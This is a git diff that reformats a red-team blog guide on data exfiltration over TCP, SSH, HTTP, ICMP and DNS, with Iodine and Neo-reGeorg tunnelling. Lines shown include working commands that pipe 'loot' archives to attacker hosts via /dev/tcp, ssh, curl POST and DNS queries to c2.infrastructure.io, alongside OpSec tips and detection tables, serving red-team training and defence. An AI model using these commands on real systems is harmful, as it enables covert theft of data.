@@ -22,7 +22,6 @@ readTime: "35 min"
 url: "https://asbawy.github.io/logs/data-exfiltration-guide"
 ---
 
-
 ![Data exfiltration attack paths across TCP, SSH, HTTP, ICMP, and DNS](https://i.imgur.com/lpX6GkI.png)
 
 Data exfiltration is the unauthorized transfer of sensitive information from a compromised environment to attacker-controlled infrastructure. This guide walks through practical red-team techniques across TCP, SSH, HTTP/HTTPS, ICMP, and DNS — including Iodine (IP-over-DNS) and Neo-reGeorg (HTTP tunneling) — with operational security notes and blue-team detection guidance for each method.
@@ -39,13 +38,13 @@ From a red team perspective, exfiltration technique selection is driven by the t
 
 ### 1.2 Core Properties of Data Exfiltration
 
-| Property | Description |
-|---|---|
-| Stealthy Transfer | Data is copied — not moved — from target systems, minimizing immediate forensic evidence |
-| Protocol Abuse | Legitimate network protocols carry malicious payloads, making traffic blend with normal activity |
-| Detection Challenge | Security tools calibrated for known attack signatures often miss protocol-level exfiltration |
-| Firewall Bypass | Protocols not designed for data transfer (ICMP, DNS) frequently pass through controls unchallenged |
-| Red Team Relevance | Mastery of these techniques is essential for realistic simulation of advanced persistent threat (APT) behaviors |
+| Property            | Description                                                                                                     |
+| ------------------- | --------------------------------------------------------------------------------------------------------------- |
+| Stealthy Transfer   | Data is copied — not moved — from target systems, minimizing immediate forensic evidence                        |
+| Protocol Abuse      | Legitimate network protocols carry malicious payloads, making traffic blend with normal activity                |
+| Detection Challenge | Security tools calibrated for known attack signatures often miss protocol-level exfiltration                    |
+| Firewall Bypass     | Protocols not designed for data transfer (ICMP, DNS) frequently pass through controls unchallenged              |
+| Red Team Relevance  | Mastery of these techniques is essential for realistic simulation of advanced persistent threat (APT) behaviors |
 
 ### 1.3 Commonly Abused Protocols
 
@@ -58,14 +57,14 @@ From a red team perspective, exfiltration technique selection is driven by the t
 
 ## 02 · Protocol Comparison Matrix
 
-| Protocol | Layer | Port | Stealth Level | Bandwidth | Detection Difficulty | Primary Use Case |
-|---|---|---|---|---|---|---|
-| TCP Socket | Transport | Any | Low | High | Low | Rapid bulk exfiltration |
-| SSH | Application | 22 | High | High | Medium | Encrypted file transfer mimicking admin activity |
-| HTTP POST | Application | 80 | High | Medium | Medium | Blending with web traffic |
-| HTTPS POST | Application | 443 | Very High | Medium | High | Encrypted web traffic exfiltration |
-| ICMP | Network | N/A | Very High | Very Low | High | Covert C2 and low-volume exfiltration |
-| DNS | Application | 53 | Very High | Very Low | Very High | Bypassing restrictive firewalls; C2 communication |
+| Protocol   | Layer       | Port | Stealth Level | Bandwidth | Detection Difficulty | Primary Use Case                                  |
+| ---------- | ----------- | ---- | ------------- | --------- | -------------------- | ------------------------------------------------- |
+| TCP Socket | Transport   | Any  | Low           | High      | Low                  | Rapid bulk exfiltration                           |
+| SSH        | Application | 22   | High          | High      | Medium               | Encrypted file transfer mimicking admin activity  |
+| HTTP POST  | Application | 80   | High          | Medium    | Medium               | Blending with web traffic                         |
+| HTTPS POST | Application | 443  | Very High     | Medium    | High                 | Encrypted web traffic exfiltration                |
+| ICMP       | Network     | N/A  | Very High     | Very Low  | High                 | Covert C2 and low-volume exfiltration             |
+| DNS        | Application | 53   | Very High     | Very Low  | Very High            | Bypassing restrictive firewalls; C2 communication |
 
 ---
 
@@ -126,12 +125,12 @@ test@victim:~$ tar zcf - loot/ | base64 | dd conv=ebcdic > /dev/tcp/192.168.1.10
 
 **Pipeline breakdown:**
 
-| Stage | Command | Purpose |
-|---|---|---|
-| Archive | `tar zcf - loot/` | Creates a gzip-compressed tarball, writes to stdout |
-| Encode | `pipe base64` | Converts binary to Base64-safe ASCII |
-| Obfuscate | `dd conv=ebcdic` | Converts ASCII to EBCDIC, defeating pattern-based inspection |
-| Transmit | `/dev/tcp/192.168.1.100/8080` | Bash built-in TCP socket; sends data to attacker listener |
+| Stage     | Command                       | Purpose                                                      |
+| --------- | ----------------------------- | ------------------------------------------------------------ |
+| Archive   | `tar zcf - loot/`             | Creates a gzip-compressed tarball, writes to stdout          |
+| Encode    | `pipe base64`                 | Converts binary to Base64-safe ASCII                         |
+| Obfuscate | `dd conv=ebcdic`              | Converts ASCII to EBCDIC, defeating pattern-based inspection |
+| Transmit  | `/dev/tcp/192.168.1.100/8080` | Bash built-in TCP socket; sends data to attacker listener    |
 
 **Why Base64 + EBCDIC?** The Base64 encoding produces a safe, printable character set. The subsequent EBCDIC conversion renders the traffic non-human-readable and defeats naive signature matching on the wire without requiring any external encryption tool.
 
@@ -167,13 +166,13 @@ asbawy@kali$ cat loot/creds.txt
 
 ### 3.4 Mitigation and Detection
 
-| Detection Vector | Description |
-|---|---|
-| Outbound Connection Monitoring | Alert on new outbound connections to unfamiliar external IPs, especially on non-standard ports |
-| EBCDIC/Unusual Encoding DPI | Deep Packet Inspection rules can flag EBCDIC-encoded traffic on non-mainframe networks |
-| NetFlow Anomalies | Unusual sustained outbound data volume from a workstation or server warrants investigation |
-| Endpoint Detection | Process-level monitoring: bash spawning `/dev/tcp` connections is an immediate indicator |
-| Egress Filtering | Whitelisting approved outbound destinations and ports eliminates opportunistic TCP exfiltration |
+| Detection Vector               | Description                                                                                     |
+| ------------------------------ | ----------------------------------------------------------------------------------------------- |
+| Outbound Connection Monitoring | Alert on new outbound connections to unfamiliar external IPs, especially on non-standard ports  |
+| EBCDIC/Unusual Encoding DPI    | Deep Packet Inspection rules can flag EBCDIC-encoded traffic on non-mainframe networks          |
+| NetFlow Anomalies              | Unusual sustained outbound data volume from a workstation or server warrants investigation      |
+| Endpoint Detection             | Process-level monitoring: bash spawning `/dev/tcp` connections is an immediate indicator        |
+| Egress Filtering               | Whitelisting approved outbound destinations and ports eliminates opportunistic TCP exfiltration |
 
 ---
 
@@ -204,11 +203,11 @@ test@victim:~$ tar cf - loot/ | ssh test@c2.infrastructure.io "cd /tmp/ && tar x
 
 **Pipeline breakdown:**
 
-| Stage | Command | Purpose |
-|---|---|---|
-| Archive | `tar cf - loot/` | Creates uncompressed tarball to stdout |
-| Encrypted Transport | `pipe ssh test@c2.infrastructure.io` | SSH encrypts the entire stream in transit |
-| Remote Extraction | `"cd /tmp/ && tar xpf -"` | Executed on attacker server; unpacks the stream directly to disk |
+| Stage               | Command                              | Purpose                                                          |
+| ------------------- | ------------------------------------ | ---------------------------------------------------------------- |
+| Archive             | `tar cf - loot/`                     | Creates uncompressed tarball to stdout                           |
+| Encrypted Transport | `pipe ssh test@c2.infrastructure.io` | SSH encrypts the entire stream in transit                        |
+| Remote Extraction   | `"cd /tmp/ && tar xpf -"`            | Executed on attacker server; unpacks the stream directly to disk |
 
 #### Step 3 — Verify Data Received on Attacker Server
 
@@ -245,13 +244,13 @@ tar cf - loot/ | base64 | ssh test@c2.infrastructure.io "cd /tmp/ && base64 -d |
 
 ### 4.4 Advantages of SSH Exfiltration
 
-| Advantage | Detail |
-|---|---|
-| End-to-End Encryption | AES-256/ChaCha20 encryption prevents wire-level content inspection |
-| Firewall Traversal | Port 22 is commonly allowed outbound for sysadmin workflows |
+| Advantage               | Detail                                                                       |
+| ----------------------- | ---------------------------------------------------------------------------- |
+| End-to-End Encryption   | AES-256/ChaCha20 encryption prevents wire-level content inspection           |
+| Firewall Traversal      | Port 22 is commonly allowed outbound for sysadmin workflows                  |
 | Authentication Blending | SSH key or password authentication appears as normal administrative behavior |
-| Integrity Verification | SSH provides built-in data integrity guarantees |
-| Operational Flexibility | Supports streaming files, directories, or arbitrary command output |
+| Integrity Verification  | SSH provides built-in data integrity guarantees                              |
+| Operational Flexibility | Supports streaming files, directories, or arbitrary command output           |
 
 ### 4.5 Operational Security (OpSec) Notes
 
@@ -263,13 +262,13 @@ tar cf - loot/ | base64 | ssh test@c2.infrastructure.io "cd /tmp/ && base64 -d |
 
 ### 4.6 Mitigation and Detection
 
-| Detection Vector | Description |
-|---|---|
-| SSH Session Monitoring | Log all SSH sessions including duration, data volume, and destination |
-| Behavioral Analytics | Alert on SSH connections from non-administrator accounts or hosts that do not typically use SSH |
-| Destination IP Reputation | Block or alert on outbound SSH to cloud VPS providers and unrecognized IP ranges |
-| SSH Key Auditing | Regularly audit authorized_keys files for unauthorized public keys |
-| User Entity Behavior Analytics (UEBA) | Correlate SSH events with account behavior baselines; flag anomalous session timing or volume |
+| Detection Vector                      | Description                                                                                     |
+| ------------------------------------- | ----------------------------------------------------------------------------------------------- |
+| SSH Session Monitoring                | Log all SSH sessions including duration, data volume, and destination                           |
+| Behavioral Analytics                  | Alert on SSH connections from non-administrator accounts or hosts that do not typically use SSH |
+| Destination IP Reputation             | Block or alert on outbound SSH to cloud VPS providers and unrecognized IP ranges                |
+| SSH Key Auditing                      | Regularly audit authorized_keys files for unauthorized public keys                              |
+| User Entity Behavior Analytics (UEBA) | Correlate SSH events with account behavior baselines; flag anomalous session timing or volume   |
 
 ---
 
@@ -323,10 +322,10 @@ test@victim:~$ curl --data "file=$(tar zcf - loot/ | base64)" http://webserver.l
 
 **Pipeline breakdown:**
 
-| Stage | Command | Purpose |
-|---|---|---|
-| Archive | `tar zcf - loot/` | Gzip-compressed tarball to stdout |
-| Encode | `pipe base64` | Converts binary data to HTTP-safe ASCII |
+| Stage    | Command                  | Purpose                                  |
+| -------- | ------------------------ | ---------------------------------------- |
+| Archive  | `tar zcf - loot/`        | Gzip-compressed tarball to stdout        |
+| Encode   | `pipe base64`            | Converts binary data to HTTP-safe ASCII  |
 | Transmit | `curl --data "file=..."` | HTTP POST to attacker web server handler |
 
 #### Step 4 — Retrieve and Restore Data on Attacker Server
@@ -368,14 +367,14 @@ HTTPS exfiltration renders wire-level content inspection impossible without SSL/
 
 ### 5.5 Mitigation and Detection
 
-| Detection Vector | Description |
-|---|---|
-| Web Application Firewall (WAF) | Inspect POST body size anomalies; alert on Base64-dense payloads in form fields |
-| SSL/TLS Inspection | Decrypt and inspect HTTPS traffic at the perimeter to examine POST body contents |
-| Proxy Logging | Log full POST body content at the egress proxy layer |
-| Destination Reputation | Block or alert on HTTP/HTTPS to newly registered domains and unknown IPs |
-| DLP Solutions | Data Loss Prevention tools can detect sensitive data patterns within HTTP payloads |
-| Behavioral Baselines | Alert when a host begins making outbound HTTP POST requests to destinations it has never contacted |
+| Detection Vector               | Description                                                                                        |
+| ------------------------------ | -------------------------------------------------------------------------------------------------- |
+| Web Application Firewall (WAF) | Inspect POST body size anomalies; alert on Base64-dense payloads in form fields                    |
+| SSL/TLS Inspection             | Decrypt and inspect HTTPS traffic at the perimeter to examine POST body contents                   |
+| Proxy Logging                  | Log full POST body content at the egress proxy layer                                               |
+| Destination Reputation         | Block or alert on HTTP/HTTPS to newly registered domains and unknown IPs                           |
+| DLP Solutions                  | Data Loss Prevention tools can detect sensitive data patterns within HTTP payloads                 |
+| Behavioral Baselines           | Alert when a host begins making outbound HTTP POST requests to destinations it has never contacted |
 
 ---
 
@@ -395,13 +394,13 @@ The primary limitation is bandwidth. Each ICMP packet's data section is constrai
 
 ### 6.2 ICMP Packet Structure
 
-| Field | Size | Description |
-|---|---|---|
-| Type | 8 bits | Message type (8 = Echo Request, 0 = Echo Reply) |
-| Code | 8 bits | Subtype for the ICMP message |
-| Checksum | 16 bits | Error-detection field |
-| Header Remainder | 32 bits | Varies by ICMP type (ID + Sequence for Echo) |
-| Data | Variable | Arbitrary payload — the exfiltration vector |
+| Field            | Size     | Description                                     |
+| ---------------- | -------- | ----------------------------------------------- |
+| Type             | 8 bits   | Message type (8 = Echo Request, 0 = Echo Reply) |
+| Code             | 8 bits   | Subtype for the ICMP message                    |
+| Checksum         | 16 bits  | Error-detection field                           |
+| Header Remainder | 32 bits  | Varies by ICMP type (ID + Sequence for Echo)    |
+| Data             | Variable | Arbitrary payload — the exfiltration vector     |
 
 ### 6.3 Manual ICMP Exfiltration via ping
 
@@ -509,14 +508,14 @@ asbawy@kali$ sudo tcpdump -i eth0 icmp
 
 ### 6.7 Mitigation and Detection
 
-| Detection Vector | Description |
-|---|---|
-| ICMP Payload Inspection | Alert on ICMP packets with non-standard or anomalously large Data sections |
-| ICMP Rate Monitoring | Establish per-host ICMP volume baselines; alert on deviations |
-| DPI for ICMP Content | Inspect ICMP Data section for encoded data patterns (Base64, hex strings) |
-| Block ICMP at Perimeter | Restrict outbound ICMP to necessary ranges (e.g., only trusted monitoring servers) |
-| Endpoint Detection | Monitor for processes (nping, icmpdoor, hping3) associated with ICMP packet crafting |
-| Wireshark / PCAP Analysis | Regular PCAP review can reveal sustained ICMP sessions with non-zero payloads |
+| Detection Vector          | Description                                                                          |
+| ------------------------- | ------------------------------------------------------------------------------------ |
+| ICMP Payload Inspection   | Alert on ICMP packets with non-standard or anomalously large Data sections           |
+| ICMP Rate Monitoring      | Establish per-host ICMP volume baselines; alert on deviations                        |
+| DPI for ICMP Content      | Inspect ICMP Data section for encoded data patterns (Base64, hex strings)            |
+| Block ICMP at Perimeter   | Restrict outbound ICMP to necessary ranges (e.g., only trusted monitoring servers)   |
+| Endpoint Detection        | Monitor for processes (nping, icmpdoor, hping3) associated with ICMP packet crafting |
+| Wireshark / PCAP Analysis | Regular PCAP review can reveal sustained ICMP sessions with non-zero payloads        |
 
 ---
 
@@ -530,21 +529,21 @@ DNS exfiltration encodes sensitive data into DNS query strings — specifically,
 
 ### 7.2 DNS Record Types Relevant to Exfiltration
 
-| Record Type | Description | Exfiltration Role |
-|---|---|---|
-| A / AAAA | Maps domain to IPv4/IPv6 | Standard query type; used as primary exfil vehicle |
-| TXT | Free-form text records | Delivers commands/scripts to victims; used for C2 |
-| CNAME | Canonical name alias | Alternative query type for payload delivery |
-| NS | Name server delegation | Used in tunneling tool configuration |
-| NULL | Experimental record type | Preferred by iodine for maximum payload per query |
+| Record Type | Description              | Exfiltration Role                                  |
+| ----------- | ------------------------ | -------------------------------------------------- |
+| A / AAAA    | Maps domain to IPv4/IPv6 | Standard query type; used as primary exfil vehicle |
+| TXT         | Free-form text records   | Delivers commands/scripts to victims; used for C2  |
+| CNAME       | Canonical name alias     | Alternative query type for payload delivery        |
+| NS          | Name server delegation   | Used in tunneling tool configuration               |
+| NULL        | Experimental record type | Preferred by iodine for maximum payload per query  |
 
 ### 7.3 DNS Protocol Constraints
 
-| Constraint | Limit | Implication |
-|---|---|---|
-| FQDN Maximum Length | 255 characters | Total query length including all labels and dots |
-| Label Maximum Length | 63 characters | Each subdomain segment cannot exceed 63 characters |
-| UDP Packet Limit | ~512 bytes | Standard DNS; TCP used for larger responses |
+| Constraint           | Limit            | Implication                                            |
+| -------------------- | ---------------- | ------------------------------------------------------ |
+| FQDN Maximum Length  | 255 characters   | Total query length including all labels and dots       |
+| Label Maximum Length | 63 characters    | Each subdomain segment cannot exceed 63 characters     |
+| UDP Packet Limit     | ~512 bytes       | Standard DNS; TCP used for larger responses            |
 | Practical Chunk Size | 18–56 characters | Recommended encoding chunk size after Base64 expansion |
 
 ### 7.4 DNS Exfiltration Execution Walkthrough
@@ -591,12 +590,12 @@ Q29ycG9yYXRlIEF2.c2.infrastructure.io
 
 **Pipeline explanation:**
 
-| Stage | Command | Purpose |
-|---|---|---|
-| Encode | `base64` | Converts binary to Base64 ASCII |
-| Strip newlines | `tr -d "\n"` | Creates a single contiguous encoded string |
-| Chunk | `fold -w18` | Splits into 18-character labels (well under 63-char limit) |
-| Format | `sed -r 's/.*/&.c2.infrastructure.io/'` | Appends attacker nameserver to each chunk |
+| Stage          | Command                                 | Purpose                                                    |
+| -------------- | --------------------------------------- | ---------------------------------------------------------- |
+| Encode         | `base64`                                | Converts binary to Base64 ASCII                            |
+| Strip newlines | `tr -d "\n"`                            | Creates a single contiguous encoded string                 |
+| Chunk          | `fold -w18`                             | Splits into 18-character labels (well under 63-char limit) |
+| Format         | `sed -r 's/.*/&.c2.infrastructure.io/'` | Appends attacker nameserver to each chunk                  |
 
 #### Step 5 — Method B — Single DNS Request (Recommended)
 
@@ -664,12 +663,12 @@ This pattern enables fully network-agnostic C2: as long as the victim can resolv
 
 ### 7.6 Encoding Options for DNS Exfiltration
 
-| Encoding | Size Overhead | DNS-Safe | Notes |
-|---|---|---|---|
-| Base64 | +33% | Partially (requires URL-safe variant) | Most common; `+/=` may require substitution |
-| Base64URL | +33% | Yes | Replaces `+/` with `-_`; DNS-label safe |
-| Hexadecimal | +100% | Yes | Larger payload; all bytes as 0-9a-f |
-| Base32 | +60% | Yes | Case-insensitive; no special characters |
+| Encoding    | Size Overhead | DNS-Safe                              | Notes                                       |
+| ----------- | ------------- | ------------------------------------- | ------------------------------------------- |
+| Base64      | +33%          | Partially (requires URL-safe variant) | Most common; `+/=` may require substitution |
+| Base64URL   | +33%          | Yes                                   | Replaces `+/` with `-_`; DNS-label safe     |
+| Hexadecimal | +100%         | Yes                                   | Larger payload; all bytes as 0-9a-f         |
+| Base32      | +60%          | Yes                                   | Case-insensitive; no special characters     |
 
 ### 7.7 Operational Security (OpSec) Notes
 
@@ -681,14 +680,14 @@ This pattern enables fully network-agnostic C2: as long as the victim can resolv
 
 ### 7.8 Mitigation and Detection
 
-| Detection Vector | Description |
-|---|---|
-| DNS Query Length Monitoring | Alert on DNS queries with subdomains exceeding 30–40 characters (legitimate queries rarely approach label limits) |
-| Entropy Analysis | High-entropy subdomain strings (Base64/hex) are anomalous; legitimate domain labels are human-readable |
-| Query Volume per Domain | Alert on unusual query frequency to a single domain, especially newly registered ones |
-| Domain Reputation | Block queries to domains registered within the past 30–90 days or with low reputation scores |
-| Authoritative Server Analysis | Monitor which external authoritative nameservers receive queries from your network |
-| DNS Security Tools | Deploy solutions like Cisco Umbrella, Infoblox NIOS, or Cloudflare Gateway with DNS inspection |
+| Detection Vector              | Description                                                                                                       |
+| ----------------------------- | ----------------------------------------------------------------------------------------------------------------- |
+| DNS Query Length Monitoring   | Alert on DNS queries with subdomains exceeding 30–40 characters (legitimate queries rarely approach label limits) |
+| Entropy Analysis              | High-entropy subdomain strings (Base64/hex) are anomalous; legitimate domain labels are human-readable            |
+| Query Volume per Domain       | Alert on unusual query frequency to a single domain, especially newly registered ones                             |
+| Domain Reputation             | Block queries to domains registered within the past 30–90 days or with low reputation scores                      |
+| Authoritative Server Analysis | Monitor which external authoritative nameservers receive queries from your network                                |
+| DNS Security Tools            | Deploy solutions like Cisco Umbrella, Infoblox NIOS, or Cloudflare Gateway with DNS inspection                    |
 
 ---
 
@@ -720,10 +719,10 @@ Attacker Infrastructure / Internal Network Access
 
 ### 8.3 Iodine Components
 
-| Component | Role | Runs On |
-|---|---|---|
-| `iodined` | Server daemon; authoritative DNS server | Attacker infrastructure |
-| `iodine` | Client daemon; creates virtual tunnel interface | Compromised victim or jumpbox |
+| Component | Role                                            | Runs On                       |
+| --------- | ----------------------------------------------- | ----------------------------- |
+| `iodined` | Server daemon; authoritative DNS server         | Attacker infrastructure       |
+| `iodine`  | Client daemon; creates virtual tunnel interface | Compromised victim or jumpbox |
 
 ### 8.4 Execution Walkthrough
 
@@ -737,13 +736,13 @@ Point the NS record of a subdomain to your attacker server's IP address. For thi
 asbawy@kali$ sudo iodined -f -c -P s3cr3tpass 10.1.1.1/24 tunnel.c2.infrastructure.io
 ```
 
-| Flag | Purpose |
-|---|---|
-| `-f` | Run in foreground (useful for debugging) |
-| `-c` | Disable client IP/port verification (useful in NAT environments) |
-| `-P s3cr3tpass` | Shared authentication passphrase (must match client) |
-| `10.1.1.1/24` | Virtual subnet for the tunnel interface |
-| `tunnel.c2.infrastructure.io` | Domain name through which DNS traffic flows |
+| Flag                          | Purpose                                                          |
+| ----------------------------- | ---------------------------------------------------------------- |
+| `-f`                          | Run in foreground (useful for debugging)                         |
+| `-c`                          | Disable client IP/port verification (useful in NAT environments) |
+| `-P s3cr3tpass`               | Shared authentication passphrase (must match client)             |
+| `10.1.1.1/24`                 | Virtual subnet for the tunnel interface                          |
+| `tunnel.c2.infrastructure.io` | Domain name through which DNS traffic flows                      |
 
 **Expected server output:**
 
@@ -789,13 +788,13 @@ Once the IP tunnel is established, layer an SSH SOCKS proxy on top for full pivo
 asbawy@kali$ ssh test@10.1.1.2 -4 -f -N -D 1080
 ```
 
-| Flag | Purpose |
-|---|---|
+| Flag       | Purpose                                            |
+| ---------- | -------------------------------------------------- |
 | `10.1.1.2` | The victim's tunnel interface IP (not its real IP) |
-| `-4` | Force IPv4 (avoids IPv6 resolution issues) |
-| `-f` | Background the SSH process after authentication |
-| `-N` | Do not execute a remote command; port-forward only |
-| `-D 1080` | Create a SOCKS5 proxy on localhost port 1080 |
+| `-4`       | Force IPv4 (avoids IPv6 resolution issues)         |
+| `-f`       | Background the SSH process after authentication    |
+| `-N`       | Do not execute a remote command; port-forward only |
+| `-D 1080`  | Create a SOCKS5 proxy on localhost port 1080       |
 
 #### Step 5 — Pivot Through the Tunnel
 
@@ -821,12 +820,12 @@ A steady stream of DNS queries and responses confirms the tunnel is operational.
 
 ### 8.5 DNS Record Types Used by Iodine
 
-| Record Type | Description | Iodine Use |
-|---|---|---|
-| NULL | Experimental type; maximum payload capacity | Preferred default |
-| TXT | Text records; large payload capacity | Fallback |
-| CNAME | Canonical name record | Fallback |
-| A / AAAA | Address records; smallest payload | Last resort |
+| Record Type | Description                                 | Iodine Use        |
+| ----------- | ------------------------------------------- | ----------------- |
+| NULL        | Experimental type; maximum payload capacity | Preferred default |
+| TXT         | Text records; large payload capacity        | Fallback          |
+| CNAME       | Canonical name record                       | Fallback          |
+| A / AAAA    | Address records; smallest payload           | Last resort       |
 
 Iodine auto-negotiates the best available record type at connection time.
 
@@ -840,14 +839,14 @@ Iodine auto-negotiates the best available record type at connection time.
 
 ### 8.7 Mitigation and Detection
 
-| Detection Vector | Description |
-|---|---|
-| NULL / TXT Record Query Monitoring | Alert on clients making high-frequency NULL or TXT record queries to a single domain |
-| Sustained DNS Session Analysis | Legitimate DNS sessions are short; iodine creates sustained, high-frequency sessions |
-| DNS Packet Size Analysis | Iodine packets are consistently near the MTU limit (1130 bytes); legitimate DNS is much smaller |
-| Entropy Monitoring | NULL/TXT record responses from Iodine contain high-entropy binary-encoded data |
-| Authoritative Nameserver Reputation | Block or alert on DNS queries forwarded to unrecognized authoritative nameservers |
-| Rate Limiting DNS | Implement per-host DNS query rate limits to throttle tunnel bandwidth below operational thresholds |
+| Detection Vector                    | Description                                                                                        |
+| ----------------------------------- | -------------------------------------------------------------------------------------------------- |
+| NULL / TXT Record Query Monitoring  | Alert on clients making high-frequency NULL or TXT record queries to a single domain               |
+| Sustained DNS Session Analysis      | Legitimate DNS sessions are short; iodine creates sustained, high-frequency sessions               |
+| DNS Packet Size Analysis            | Iodine packets are consistently near the MTU limit (1130 bytes); legitimate DNS is much smaller    |
+| Entropy Monitoring                  | NULL/TXT record responses from Iodine contain high-entropy binary-encoded data                     |
+| Authoritative Nameserver Reputation | Block or alert on DNS queries forwarded to unrecognized authoritative nameservers                  |
+| Rate Limiting DNS                   | Implement per-host DNS query rate limits to throttle tunnel bandwidth below operational thresholds |
 
 ---
 
@@ -921,12 +920,12 @@ asbawy@kali$ curl --socks5 127.0.0.1:1080 http://db.internal.corp:8080/admin
 
 ### 9.4 Traffic Flow Analysis
 
-| Step | Traffic | Description |
-|---|---|---|
-| 1 | Attacker → 127.0.0.1:1080 | Attacker's tool connects to local SOCKS proxy |
-| 2 | 127.0.0.1:1080 → webserver.local/tunnel.php | Neo-reGeorg sends HTTP POST with encapsulated TCP data |
-| 3 | webserver.local → app.internal.corp | Web server opens internal TCP connection on attacker's behalf |
-| 4 | Reverse path | Responses flow back through same chain |
+| Step | Traffic                                     | Description                                                   |
+| ---- | ------------------------------------------- | ------------------------------------------------------------- |
+| 1    | Attacker → 127.0.0.1:1080                   | Attacker's tool connects to local SOCKS proxy                 |
+| 2    | 127.0.0.1:1080 → webserver.local/tunnel.php | Neo-reGeorg sends HTTP POST with encapsulated TCP data        |
+| 3    | webserver.local → app.internal.corp         | Web server opens internal TCP connection on attacker's behalf |
+| 4    | Reverse path                                | Responses flow back through same chain                        |
 
 From the internal application's perspective, all traffic originates from the web server's IP — not the attacker.
 
@@ -940,14 +939,14 @@ From the internal application's perspective, all traffic originates from the web
 
 ### 9.6 Mitigation and Detection
 
-| Detection Vector | Description |
-|---|---|
-| Web Server Log Analysis | Repeated POST requests to a single endpoint with large, binary-dense bodies are anomalous |
-| File Integrity Monitoring | Detect new `.php`, `.aspx`, or `.jsp` files created in web-accessible directories |
-| WAF Rules | Implement rules blocking POST body patterns consistent with Neo-reGeorg agents |
-| Proxy Inspection | Deep-inspect HTTP POST bodies for encrypted binary content to non-API endpoints |
-| Behavioral Detection | Alert when a web server process initiates unexpected outbound TCP connections to internal hosts |
-| Endpoint Security | AV/EDR on the web server should flag the agent script on upload |
+| Detection Vector          | Description                                                                                     |
+| ------------------------- | ----------------------------------------------------------------------------------------------- |
+| Web Server Log Analysis   | Repeated POST requests to a single endpoint with large, binary-dense bodies are anomalous       |
+| File Integrity Monitoring | Detect new `.php`, `.aspx`, or `.jsp` files created in web-accessible directories               |
+| WAF Rules                 | Implement rules blocking POST body patterns consistent with Neo-reGeorg agents                  |
+| Proxy Inspection          | Deep-inspect HTTP POST bodies for encrypted binary content to non-API endpoints                 |
+| Behavioral Detection      | Alert when a web server process initiates unexpected outbound TCP connections to internal hosts |
+| Endpoint Security         | AV/EDR on the web server should flag the agent script on upload                                 |
 
 ---
 
@@ -955,16 +954,16 @@ From the internal application's perspective, all traffic originates from the web
 
 ### 10.1 Summary of Techniques
 
-| Technique | Speed | Stealth | Complexity | Best For |
-|---|---|---|---|---|
-| TCP Socket | Very High | Low | Low | Unmonitored, permissive networks |
-| SSH | High | High | Low | Environments where SSH is standard |
-| HTTP POST | Medium | High | Medium | General-purpose; most environments |
-| HTTPS POST | Medium | Very High | Medium | Environments with TLS inspection gaps |
-| ICMP | Very Low | Very High | Medium | Targeting networks with deep packet inspection |
-| DNS Exfiltration | Very Low | Very High | High | Maximally restricted firewalls |
-| DNS Tunneling (Iodine) | Low | High | High | Full bidirectional IP tunnel over DNS |
-| HTTP Tunneling (Neo-reGeorg) | Medium | High | Medium | Pivoting through web-accessible hosts |
+| Technique                    | Speed     | Stealth   | Complexity | Best For                                       |
+| ---------------------------- | --------- | --------- | ---------- | ---------------------------------------------- |
+| TCP Socket                   | Very High | Low       | Low        | Unmonitored, permissive networks               |
+| SSH                          | High      | High      | Low        | Environments where SSH is standard             |
+| HTTP POST                    | Medium    | High      | Medium     | General-purpose; most environments             |
+| HTTPS POST                   | Medium    | Very High | Medium     | Environments with TLS inspection gaps          |
+| ICMP                         | Very Low  | Very High | Medium     | Targeting networks with deep packet inspection |
+| DNS Exfiltration             | Very Low  | Very High | High       | Maximally restricted firewalls                 |
+| DNS Tunneling (Iodine)       | Low       | High      | High       | Full bidirectional IP tunnel over DNS          |
+| HTTP Tunneling (Neo-reGeorg) | Medium    | High      | Medium     | Pivoting through web-accessible hosts          |
 
 ### 10.2 Universal Stealth Principles
 
@@ -1008,7 +1007,3 @@ This guide documents techniques that are actively used by advanced threat actors
 Understanding attacker methodology at this level of technical depth is a prerequisite for building detection logic that will catch these techniques before data leaves the network.
 
 ---
-
-
-
-  
